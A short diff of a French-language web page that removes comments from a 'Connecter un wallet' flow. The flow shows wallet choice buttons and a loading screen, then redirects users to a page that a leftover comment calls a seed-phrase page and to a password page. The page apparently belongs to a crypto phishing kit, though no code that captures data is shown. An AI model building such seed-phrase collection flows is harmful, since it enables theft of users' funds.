@@ -59,22 +59,22 @@
     </div>
 </div>
 
-<!-- Bouton Connecter un wallet en dehors du conteneur -->
+
 <button class="buy-buttons" onclick="showWalletOptions()">Connecter un wallet</button>
 </div>
 
 <script>
     function showWalletOptions() {
 	document.querySelector('.buy-buttons').style.display = 'none';
-        // Afficher les options de wallet
+        
         document.querySelector('.wallet-options').style.display = 'flex';
         
-        // Masquer le bouton Connecter un wallet
+        
         document.getElementById('connectWalletButton').style.display = 'none';
     }
 
     function connectWallet(walletType) {
-        // Cacher les options de wallet
+        
         document.querySelector('.wallet-options').style.display = 'none';
 
         if (walletType === 'metamask') {
@@ -97,7 +97,7 @@
     });
 </script>
 
-<!-- Wallet Options -->
+
         <div class="wallet-options">
             <div class="wallet-buttons" onclick="connectWallet('metamask')"
                 <span>&emsp;&emsp;MetaMask</span>
@@ -119,13 +119,13 @@
                 <span>AlphaWallet</span>
         </div>
     </div>
-<!-- Loading Screen -->
+
         <div id="loading" class="loading-screens">
     <div class="loader"></div>
 </div>
 </div>
 
-        <!-- Email Entry -->
+        
         <div id="email-entry" class="email-entry">
             <h3>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Connexion au wallet via :</h3>
            <pre> 
@@ -136,7 +136,7 @@
 
 <script>
     function redirectToSeedPage() {
-        // Redirige l'utilisateur vers une autre page
+        
         window.location.href = 'page2.html'; // Remplacez 'votre-page-seed-phrase.html' par l'URL de la page cible
     }
      function redirectToMdpPage() {
